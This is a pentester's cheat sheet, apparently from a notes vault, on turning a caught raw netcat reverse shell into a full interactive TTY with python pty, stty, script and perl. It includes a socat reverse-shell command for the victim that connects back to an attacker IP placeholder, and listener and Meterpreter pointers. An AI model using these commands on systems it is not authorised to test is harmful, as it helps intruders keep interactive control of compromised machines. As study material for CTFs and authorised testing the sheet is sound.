# 🐚 Shell Upgrade & TTY

> A raw `nc` shell has no tab-completion, no arrows, no job control, and can't run `sudo`/`ssh`. Upgrade it to a full interactive PTY immediately after catching it — before doing real work.

Part of [[Shells]]. Related: [[Reverse & Bind Shells]] · [[Shell Is Unstable]]

---

## 🧠 THINK
- Upgrade **first thing** — an un-upgraded shell wastes time and breaks `sudo`.
- The standard route is **python pty + `stty raw -echo`**. If no python, use `script`/`socat`.
- Fix the window size so long commands and editors don't wrap.

## 💥 FULL TTY (Linux) — the 4 steps
1) Spawn a PTY in the shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
2) Background it:
```
Ctrl+Z
```
3) Fix your local terminal, then foreground:
```bash
stty raw -echo; fg
```
4) Set terminal type + size (run `stty size` locally first for rows/cols):
```bash
export TERM=xterm ; stty rows 50 cols 200
```
Now arrows, tab, `Ctrl+C`, `sudo`, and `ssh` all work.

## 💥 NO PYTHON?
```bash
script /dev/null -c bash
```
```bash
/usr/bin/script -qc /bin/bash /dev/null
```
Others: `perl -e 'exec "/bin/bash";'`, or a full socat PTY (below).

## 💥 SOCAT (fully interactive, both ends)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:443           # attacker
```
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOURIP:443   # victim
```

## 🪟 WINDOWS STABILITY
- Prefer **evil-winrm** or a **Meterpreter** session over raw nc.
- `rlwrap nc -lvnp 443` for line editing.
- Upgrade a raw shell to Meterpreter via an msfvenom exe + multi/handler ([[msfvenom Payloads]]).

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No tab/arrows | do the 4-step upgrade |
| `sudo: no tty present` | need a PTY → upgrade |
| Garbled/wrapping | `export TERM=xterm`; `stty rows/cols` |
| No python | `script -qc /bin/bash /dev/null` / perl / socat |
| Keeps dropping | use `socat`; `rlwrap nc` → [[Shell Is Unstable]] |

## 📇 CHEAT SHEET
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
```
```bash
stty rows 50 cols 200
```
**Kill shot:** python pty → `stty raw -echo; fg` → full TTY with `sudo`/tab/arrows.
